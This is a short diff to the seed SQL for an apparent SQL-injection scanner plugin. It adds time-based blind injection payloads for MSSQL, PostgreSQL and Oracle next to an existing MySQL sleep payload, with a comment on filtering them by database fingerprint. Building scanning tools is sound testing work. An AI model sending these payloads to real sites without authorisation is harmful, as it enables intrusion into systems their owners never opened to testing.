@@ -66,3 +66,9 @@ INSERT OR IGNORE INTO 'sqli' VALUES (15, 'header', 'Cookie');
 INSERT OR IGNORE INTO 'sqli' VALUES (21, 'domain', 'www.baidu.com');
 INSERT OR IGNORE INTO 'sqli' VALUES (22, 'domain', 'www.qq.com');
 INSERT OR IGNORE INTO 'sqli' VALUES (23, 'payload', '0''XOR(if(1,sleep(6),0))XOR''Z');
+-- 多数据库时间盲注种子（仅全新库播种；运行时分发由 SqlUI.isPayloadCompatible 按数据库指纹过滤：
+-- MSSQL 只留 waitfor / MySQL 只留 sleep / PostgreSQL 只留 pg_sleep / Oracle 只留 dbms_pipe）
+INSERT OR IGNORE INTO 'sqli' VALUES (24, 'payload', ''';WAITFOR DELAY ''0:0:6''--');
+INSERT OR IGNORE INTO 'sqli' VALUES (25, 'payload', '1'';WAITFOR DELAY ''0:0:6''--');
+INSERT OR IGNORE INTO 'sqli' VALUES (26, 'payload', ''';SELECT pg_sleep(6)--');
+INSERT OR IGNORE INTO 'sqli' VALUES (27, 'payload', ''' || DBMS_PIPE.RECEIVE_MESSAGE(''a'', 6) || ''');
